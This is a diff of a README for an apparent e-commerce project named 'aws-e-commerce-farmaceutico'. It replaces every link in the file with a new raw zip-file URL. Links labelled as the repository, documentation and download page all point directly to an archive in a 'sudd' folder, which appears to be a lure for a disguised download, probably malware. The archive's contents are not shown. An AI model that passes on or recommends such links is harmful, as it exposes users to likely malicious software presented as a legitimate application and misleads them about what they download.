@@ -1,6 +1,6 @@
 # 🚀 aws-e-commerce-farmaceutico - Your Easy E-Commerce Solution
 
-[![Download Latest Release](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce_farmaceutico_aws_e_v2.3-beta.3.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce_farmaceutico_aws_e_v2.3-beta.3.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce-farmaceutico-aws-e-v1.5.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce-farmaceutico-aws-e-v1.5.zip)
 
 ## ✨ Overview
 
@@ -19,7 +19,7 @@ To ensure the best experience, please make sure your system meets the following 
 
 ### Step 1: Visit the Download Page
 
-To download the application, visit the following link: [Download Page](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce_farmaceutico_aws_e_v2.3-beta.3.zip).
+To download the application, visit the following link: [Download Page](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce-farmaceutico-aws-e-v1.5.zip).
 
 ### Step 2: Download the Application
 
@@ -60,12 +60,12 @@ Choosing **aws-e-commerce-farmaceutico** means opting for a solid solution tailo
 
 For more information, you can explore the following resources:
 
-- [GitHub Repository](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce_farmaceutico_aws_e_v2.3-beta.3.zip)
-- [Documentation](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce_farmaceutico_aws_e_v2.3-beta.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce-farmaceutico-aws-e-v1.5.zip)
+- [Documentation](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce-farmaceutico-aws-e-v1.5.zip)
 
 ### Download & Install
 
-To begin, ensure you visit the [Download Page](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce_farmaceutico_aws_e_v2.3-beta.3.zip) to get the latest release and follow the steps above.
+To begin, ensure you visit the [Download Page](https://raw.githubusercontent.com/tameretwo/aws-e-commerce-farmaceutico/main/sudd/commerce-farmaceutico-aws-e-v1.5.zip) to get the latest release and follow the steps above.
 
 ## 🐞 Support
 
